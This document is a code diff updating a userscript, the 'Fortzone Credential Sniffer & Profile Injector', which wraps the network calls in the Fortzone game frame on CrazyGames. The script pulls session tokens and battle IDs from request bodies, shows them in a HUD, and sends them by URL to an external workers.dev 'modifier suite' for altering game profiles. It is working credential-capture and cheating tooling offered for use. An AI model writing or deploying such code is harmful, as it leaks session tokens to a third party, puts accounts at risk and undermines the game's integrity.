@@ -1,19 +1,22 @@
 // ==UserScript==
 // @name         Fortzone Credential Sniffer & Profile Injector
 // @namespace    https://github.com/grimmjs/FortZoneProfileCheats
-// @version      1.0.0
+// @version      1.1.0
 // @description  Cattura in automatico Token e Battle ID da Fortzone e li invia con 1-click alla suite di modifica
 // @author       grimmjs
-// @match        *://*.crazygames.com/*
 // @match        *://fortzone-battle-royale-xkd.game-files.crazygames.com/*
-// @match        *://*.game-files.crazygames.com/*
 // @run-at       document-start
 // @grant        GM_setClipboard
-// @grant        GM_notification
 // ==/UserScript==
 
 (function() {
     'use strict';
+
+    // Evita duplicazioni: esegui solo nel frame del gioco effettivo
+    const isGameFrame = window.location.hostname.includes('game-files.crazygames.com');
+    if (!isGameFrame) {
+        return;
+    }
 
     const MODIFIER_URL = "https://fortzoneprofilecheats.sadness-grimm.workers.dev";
     let capturedToken = localStorage.getItem('fz_captured_token') || "";
@@ -27,8 +30,7 @@
             const opts = args[1] || {};
 
             if (url && (url.includes('protondev.xyz') || url.includes('fahrenheit-dev.com'))) {
-                const body = opts.body || '';
-                inspectPayload(body);
+                inspectPayload(opts.body || '');
             }
         } catch (e) {}
 
@@ -77,25 +79,20 @@
         return originalSend.apply(this, arguments);
     };
 
-    // Parser di payload e parametri
     function inspectPayload(body) {
         if (!body) return;
         const str = typeof body === 'string' ? body : '';
 
-        // Estrazione token
         const tokenMatch = str.match(/(?:token|sessionToken)=([^&]+)/i);
         if (tokenMatch && tokenMatch[1]) {
-            let t = decodeURIComponent(tokenMatch[1]).trim();
-            saveToken(t);
+            saveToken(decodeURIComponent(tokenMatch[1]).trim());
         }
 
-        // Estrazione Battle ID
         const battleMatch = str.match(/(?:battleId|BattleId)=([^&]+)/i);
         if (battleMatch && battleMatch[1]) {
             saveBattleId(decodeURIComponent(battleMatch[1]).trim());
         }
 
-        // Estrazione da JSON 'data='
         const dataMatch = str.match(/data=([^&]+)/i);
         if (dataMatch && dataMatch[1]) {
             try {
@@ -121,67 +118,69 @@
         }
     }
 
-    // Overlay HUD Minimal su schermo
     function createHUD() {
         if (document.getElementById('fz-sniffer-hud')) return;
 
         const hud = document.createElement('div');
         hud.id = 'fz-sniffer-hud';
         hud.style.cssText = `
-            position: fixed;
-            bottom: 16px;
-            left: 16px;
-            z-index: 9999999;
-            background: rgba(5, 7, 13, 0.95);
+            position: absolute;
+            bottom: 12px;
+            left: 12px;
+            z-index: 2147483647;
+            background: rgba(5, 7, 13, 0.94);
             border: 1px solid rgba(0, 212, 255, 0.4);
-            box-shadow: 0 0 25px rgba(0, 212, 255, 0.25);
-            border-radius: 12px;
-            padding: 12px 16px;
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
+            border-radius: 10px;
+            padding: 10px 14px;
             color: #f8fafc;
             font-family: monospace, sans-serif;
             font-size: 11px;
             display: flex;
             flex-direction: column;
-            gap: 8px;
+            gap: 6px;
             backdrop-filter: blur(8px);
-            min-width: 250px;
+            min-width: 230px;
+            pointer-events: auto;
         `;
 
         hud.innerHTML = `
-            <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid rgba(255,255,255,0.1); padding-bottom:6px;">
-                <span style="font-weight:bold; color:#38bdf8;">⚡ FORTZONE SNIFFER</span>
-                <span id="fz-status-dot" style="width:8px; height:8px; border-radius:50%; background:#ef4444;"></span>
+            <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid rgba(255,255,255,0.1); padding-bottom:4px;">
+                <span style="font-weight:bold; color:#38bdf8; font-size:10px;">⚡ FORTZONE SNIFFER</span>
+                <span id="fz-status-dot" style="width:7px; height:7px; border-radius:50%; background:#ef4444;"></span>
             </div>
             <div>
-                <div style="color:#94a3b8; font-size:10px;">BATTLE ID:</div>
-                <div id="fz-hud-battle" style="font-weight:bold; color:#fbbf24;">Waiting for match...</div>
+                <div style="color:#94a3b8; font-size:9px;">BATTLE ID:</div>
+                <div id="fz-hud-battle" style="font-weight:bold; color:#fbbf24; font-size:10px;">Waiting for match...</div>
             </div>
             <div>
-                <div style="color:#94a3b8; font-size:10px;">SESSION TOKEN:</div>
-                <div id="fz-hud-token" style="font-weight:bold; color:#34d399; word-break:break-all;">Waiting for request...</div>
+                <div style="color:#94a3b8; font-size:9px;">SESSION TOKEN:</div>
+                <div id="fz-hud-token" style="font-weight:bold; color:#34d399; font-size:10px; word-break:break-all;">Waiting for request...</div>
             </div>
-            <div style="display:flex; gap:6px; margin-top:4px;">
-                <button id="fz-btn-copy-token" style="flex:1; padding:5px; background:rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.15); border-radius:6px; color:#fff; cursor:pointer; font-size:10px;">Copy Token</button>
-                <button id="fz-btn-open-suite" style="flex:1.2; padding:5px; background:linear-gradient(90deg, #06b6d4, #2563eb); border:none; border-radius:6px; color:#fff; font-weight:bold; cursor:pointer; font-size:10px;">Open Suite 🚀</button>
+            <div style="display:flex; gap:6px; margin-top:2px;">
+                <button id="fz-btn-copy-token" style="flex:1; padding:4px; background:rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.15); border-radius:6px; color:#fff; cursor:pointer; font-size:10px;">Copy</button>
+                <button id="fz-btn-open-suite" style="flex:1.2; padding:4px; background:linear-gradient(90deg, #06b6d4, #2563eb); border:none; border-radius:6px; color:#fff; font-weight:bold; cursor:pointer; font-size:10px;">Open Suite 🚀</button>
             </div>
         `;
 
         document.body.appendChild(hud);
 
-        document.getElementById('fz-btn-copy-token').addEventListener('click', () => {
+        document.getElementById('fz-btn-copy-token').addEventListener('click', (e) => {
+            e.stopPropagation();
             if (capturedToken) {
                 if (typeof GM_setClipboard !== 'undefined') {
                     GM_setClipboard(capturedToken);
                 } else {
                     navigator.clipboard.writeText(capturedToken);
                 }
-                alert('Token copiato negli appunti!');
+                alert('Token copiato!');
             } else {
-                alert('Nessun token ancora catturato. Avvia una partita!');
+                alert('Nessun token catturato. Avvia una partita!');
             }
         });
 
-        document.getElementById('fz-btn-open-suite').addEventListener('click', () => {
+        document.getElementById('fz-btn-open-suite').addEventListener('click', (e) => {
+            e.stopPropagation();
             const url = `${MODIFIER_URL}/?token=${encodeURIComponent(capturedToken)}&battleId=${encodeURIComponent(capturedBattleId)}`;
             window.open(url, '_blank');
         });
@@ -195,18 +194,17 @@
         const dot = document.getElementById('fz-status-dot');
 
         if (hudToken && capturedToken) {
-            hudToken.textContent = capturedToken.length > 25 ? capturedToken.slice(0, 25) + '...' : capturedToken;
+            hudToken.textContent = capturedToken.length > 20 ? capturedToken.slice(0, 20) + '...' : capturedToken;
         }
         if (hudBattle && capturedBattleId) {
             hudBattle.textContent = capturedBattleId;
         }
         if (dot && capturedToken) {
             dot.style.background = '#10b981';
-            dot.style.boxShadow = '0 0 8px #10b981';
+            dot.style.boxShadow = '0 0 6px #10b981';
         }
     }
 
-    // Inizializza UI appena il DOM è pronto
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', createHUD);
     } else {
